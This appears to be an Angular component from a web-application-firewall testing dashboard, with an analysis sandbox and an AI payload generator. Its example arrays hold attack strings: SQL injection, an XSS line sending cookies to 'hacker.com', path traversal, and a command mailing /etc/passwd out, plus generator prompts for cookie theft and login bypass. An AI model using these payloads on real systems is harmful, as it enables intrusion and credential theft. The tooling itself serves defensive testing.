import { Component, ChangeDetectionStrategy, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { WafService } from '../../services/waf.service';
import { FormsModule } from '@angular/forms';
import { SecurityLevel } from '../../types';

@Component({
  selector: 'app-adaptive-defense',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './adaptive-defense.component.html',
  changeDetection: ChangeDetectionStrategy.OnPush,
})
export class AdaptiveDefenseComponent {
  wafService = inject(WafService);
  
  // For the manual analysis sandbox
  payload = signal<string>('');
  isLoading = this.wafService.isLoadingAnalysis;
  analysisResult = this.wafService.analysisResult;
  analysisError = this.wafService.analysisError;
  sandboxOpen = signal(false);
  
  // For the adaptive rules list
  adaptiveRules = this.wafService.adaptiveRules;

  // For the payload generator sandbox
  generatorSandboxOpen = signal(false);
  generationPrompt = signal<string>('');
  generationTarget = signal<string>('');
  isLoadingGeneration = this.wafService.isLoadingAiPayload;
  generationResult = this.wafService.aiGeneratedPayload;
  generationError = this.wafService.aiPayloadError;
  securityLevel = this.wafService.securityLevel;

  examplePayloads = [
    "' OR '1'='1",
    "<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>",
    "../../../../../boot.ini",
    "cat /etc/passwd | mail a@b.c"
  ];

  examplePrompts = [
    "show an alert with the text 'XSS'",
    "steal user cookies and send to a url",
    "bypass a login form"
  ];

  analyzePayload() {
    if (this.payload().trim()) {
      this.wafService.analyzePayload(this.payload());
    }
  }
  
  useExample(example: string) {
    this.payload.set(example);
    this.analyzePayload();
  }

  generatePayload() {
    if (this.generationPrompt().trim()) {
      this.wafService.generatePayloadFromPrompt({
        prompt: this.generationPrompt(),
        target: this.generationTarget()
      });
    }
  }

  useExamplePrompt(prompt: string) {
    this.generationPrompt.set(prompt);
    this.generatePayload();
  }

  sendToAttackerTools(payload: string) {
    this.wafService.payloadForAttacker.set(payload);
    this.wafService.setActiveView('attacker');
  }

  getSeverityClass(severity: string) {
    const s = severity?.toLowerCase();
    if (s === 'critical') return 'text-red-400 bg-red-500/10 border-red-500/30';
    if (s === 'high') return 'text-orange-400 bg-orange-500/10 border-orange-500/30';
    if (s === 'medium') return 'text-yellow-400 bg-yellow-500/10 border-yellow-500/30';
    return 'text-blue-400 bg-blue-500/10 border-blue-500/30';
  }

  getSecurityLevelClass(level: SecurityLevel): string {
    switch (level) {
      case 'Low': return 'bg-green-600/30 text-green-300';
      case 'Medium': return 'bg-yellow-600/30 text-yellow-300';
      case 'High': return 'bg-red-600/30 text-red-300';
      default: return 'bg-gray-600/30 text-gray-300';
    }
  }

  toggleSandbox() {
    this.sandboxOpen.update(v => !v);
  }

  toggleGeneratorSandbox() {
    this.generatorSandboxOpen.update(v => !v);
  }
}
